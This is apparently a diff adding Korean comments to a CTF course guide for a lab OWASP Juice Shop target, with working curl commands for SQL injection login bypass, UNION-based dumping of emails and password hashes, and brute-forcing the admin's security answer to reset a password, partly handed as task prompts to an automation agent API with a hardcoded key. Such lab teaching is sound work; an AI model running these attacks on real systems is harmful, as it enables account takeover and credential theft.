@@ -150,7 +150,7 @@ data = json.load(sys.stdin)['data']
 solved = [c for c in data if c.get('solved')]
 unsolved = [c for c in data if not c.get('solved')]
 print(f'Solved: {len(solved)} / Total: {len(data)}')
-for c in solved:
+for c in solved:                                       # 반복문 시작
     print(f'  [v] {c[\"name\"]} ({c[\"difficulty\"]} star)')
 " 2>/dev/null
 ```
@@ -197,7 +197,7 @@ curl -s http://10.20.30.80:3000/ftp
 # 사용자 등록
 curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"test@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'
+  -d '{"email":"test@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'  # 요청 데이터(body)
 
 # 로그인 및 토큰 획득
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
@@ -219,10 +219,10 @@ print(json.dumps(json.loads(base64.urlsafe_b64decode(d)),indent=2))
 # Admin 로그인 우회
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"x"}'
+  -d '{"email":"'\'' OR 1=1--","password":"x"}'        # 요청 데이터(body)
 
 # 검색 SQLi
-curl -s "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"
+curl -s "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"  # silent 모드
 ```
 
 ### 2.4 Week 05 - XSS
@@ -343,7 +343,7 @@ echo "Token: $ADMIN_TOKEN"
 # Step 1: 로그인 API 확인
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op","password":"wrong"}'
+  -d '{"email":"admin@juice-sh.op","password":"wrong"}'  # 요청 데이터(body)
 
 # Step 2: SQL Injection 시도
 # 방법 1: 모든 사용자 반환
@@ -401,7 +401,7 @@ TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 
 # Step 2: Captcha 가져오기
 CAPTCHA_RESPONSE=$(curl -s http://10.20.30.80:3000/api/Captchas/ \
-  -H "Authorization: Bearer $TOKEN")
+  -H "Authorization: Bearer $TOKEN")                   # 인증 토큰
 CAPTCHA_ID=$(echo "$CAPTCHA_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])" 2>/dev/null)
 CAPTCHA_ANSWER=$(echo "$CAPTCHA_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])" 2>/dev/null)
 
@@ -504,10 +504,10 @@ curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-s
 # 질문이 "Your eldest siblings middle name?" 일 경우, 가능한 답변 시도
 
 ANSWERS=("Samuel" "sam" "Admin" "admin" "test" "Zaya" "John" "Jane")
-for answer in "${ANSWERS[@]}"; do
+for answer in "${ANSWERS[@]}"; do                      # 반복문 시작
   RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
     -H "Content-Type: application/json" \
-    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"NewPass123!\",\"repeat\":\"NewPass123!\"}")
+    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"NewPass123!\",\"repeat\":\"NewPass123!\"}")  # 요청 데이터(body)
   STATUS=$(echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); print('SUCCESS' if 'user' in d else d.get('error','FAIL'))" 2>/dev/null)
   echo "Answer '$answer': $STATUS"
   if [[ "$STATUS" == "SUCCESS" ]]; then
@@ -549,7 +549,7 @@ import sys, json
 data = json.load(sys.stdin)['data']
 print(f'Total users: {len(data)}')
 print('-' * 60)
-for user in data:
+for user in data:                                      # 반복문 시작
     print(f\"ID: {user['id']}, Email: {user['email']}\")
     if 'password' in user:
         print(f\"  Password hash: {user['password']}\")
@@ -561,7 +561,7 @@ curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+em
 import sys, json
 try:
     data = json.load(sys.stdin)['data']
-    for item in data:
+    for item in data:                                  # 반복문 시작
         if '@' in str(item.get('name','')):
             print(f\"Email: {item['name']}, Hash: {item.get('description','')}\")
 except: print('UNION attack failed - try adjusting columns')
@@ -642,15 +642,15 @@ echo "Project ID: $PROJECT_ID"
 
 # Stage 전환
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
-  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
-  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
 
 # 여러 챌린지를 한 번에 실행
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
   -H "Content-Type: application/json" \
   -H "X-API-Key: opsclaw-api-key-2026" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "tasks": [
       {"order":1, "instruction_prompt":"curl -s http://10.20.30.80:3000/robots.txt", "risk_level":"low"},
       {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp", "risk_level":"low"},
@@ -670,7 +670,7 @@ curl -s -H "X-API-Key: opsclaw-api-key-2026" \
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/completion-report \
   -H "Content-Type: application/json" \
   -H "X-API-Key: opsclaw-api-key-2026" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "summary": "중간고사 CTF 자동화 완료",
     "outcome": "success",
     "work_details": [
